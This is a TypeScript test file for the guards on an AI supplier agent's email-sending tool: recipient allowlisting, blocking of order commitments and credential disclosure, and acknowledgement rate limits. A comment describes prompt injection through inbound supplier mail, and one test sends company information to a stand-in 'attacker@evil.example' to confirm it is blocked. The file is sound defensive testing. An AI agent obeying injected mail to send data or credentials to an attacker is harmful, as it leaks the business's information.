import { describe, expect, it } from "vitest";
import { emailAddressOf, emailReplyAllowlist, isAllowedEmailRecipient, MAX_ACKS_PER_SENDER_PER_DAY, claimAcknowledgement } from "@/lib/botanica-email";
import { getAgent } from "@/lib/agents";
import { listPush } from "@/lib/kv";

const ORG = "org-email-security";
const seedInbound = (from: string) =>
  listPush(`botanica_email:${ORG}`, {
    id: `m-${from}`, org_id: ORG, direction: "inbound", from, to: ["suppliers@botanicaochosi.com"],
    subject: "Cotización", text: "Adjunto catálogo.", provider_id: `p-${from}`, status: "received",
    created_at: new Date().toISOString(),
  }, 1000);

const sendTool = () => getAgent("supplier")!.tools().find((tool) => tool.name === "send_supplier_email")!;
const send = (args: Record<string, unknown>) => sendTool().handler({ orgId: ORG, depth: 0, runId: null }, args);

describe("who an agent may email", () => {
  it("reads the address out of a display name", () => {
    expect(emailAddressOf("Ventas <Ventas@Proveedor.com>")).toBe("ventas@proveedor.com");
    expect(emailAddressOf("  PLAIN@Example.COM ")).toBe("plain@example.com");
  });

  it("allows only addresses that have written to us", async () => {
    await seedInbound("ventas@proveedor-real.com");
    const allowed = await emailReplyAllowlist(ORG);
    expect(allowed.has("ventas@proveedor-real.com")).toBe(true);
    expect(await isAllowedEmailRecipient(ORG, "Ventas <ventas@proveedor-real.com>")).toBe(true);
    expect(await isAllowedEmailRecipient(ORG, "stranger@elsewhere.com")).toBe(false);
  });

  /**
   * The path that mattered: inbound mail is written by strangers and reaches
   * the agent through list_supplier_email. If an injected instruction picks the
   * recipient, the business emails whoever the attacker named.
   */
  it("refuses to send anywhere that has not corresponded with us", async () => {
    const result = await send({ to: "attacker@evil.example", subject: "hola", text: "información de la empresa" });
    expect(result).toContain("BLOCKED");
    expect(result).toContain("cold outreach");
  });

  it("still lets the agent answer a real correspondent", async () => {
    await seedInbound("contacto@mayorista.com");
    // Passing both guards means it reaches the provider, which is unconfigured
    // in tests — reaching that error is the proof it was not blocked.
    await expect(send({ to: "contacto@mayorista.com", subject: "Re: Cotización", text: "Gracias, revisamos su catálogo y volvemos con preguntas." }))
      .rejects.toThrow("RESEND_API_KEY");
  });
});

describe("what an agent may say", () => {
  const toKnown = async (text: string) => {
    await seedInbound("ventas@conocido.com");
    return send({ to: "ventas@conocido.com", subject: "Re: Cotización", text });
  };

  it("blocks a commitment written in Spanish, the language this business writes in", async () => {
    expect(await toKnown("Confirmamos el pedido de 500 unidades y autorizamos el pago.")).toContain("BLOCKED");
    expect(await toKnown("Aceptamos su contrato y las condiciones de pago.")).toContain("BLOCKED");
  });

  it("blocks the English phrasings, including the ones that used to slip through", async () => {
    expect(await toKnown("We confirm the order for 500 units.")).toContain("BLOCKED");
    expect(await toKnown("Please proceed with production; we will send the wire transfer today.")).toContain("BLOCKED");
  });

  it("blocks credential disclosure in either language", async () => {
    expect(await toKnown("Le comparto nuestra contraseña de acceso al portal.")).toContain("BLOCKED");
    expect(await toKnown("Here is our api key for the portal.")).toContain("BLOCKED");
  });

  it("still allows an ordinary reply that commits nothing", async () => {
    await expect(toKnown("Gracias por su catálogo. ¿Cuál es el MOQ y el plazo de entrega a Estados Unidos?"))
      .rejects.toThrow("RESEND_API_KEY");
  });
});

describe("automatic acknowledgements", () => {
  it("stops answering one sender after the daily limit", async () => {
    const from = "loop@autoresponder.example";
    let granted = 0;
    for (let attempt = 0; attempt < MAX_ACKS_PER_SENDER_PER_DAY + 3; attempt++) {
      if (await claimAcknowledgement(ORG, from)) granted++;
    }
    expect(granted).toBe(MAX_ACKS_PER_SENDER_PER_DAY);
  });

  it("counts each sender separately", async () => {
    expect(await claimAcknowledgement(ORG, "otro@proveedor.com")).toBe(true);
  });
});
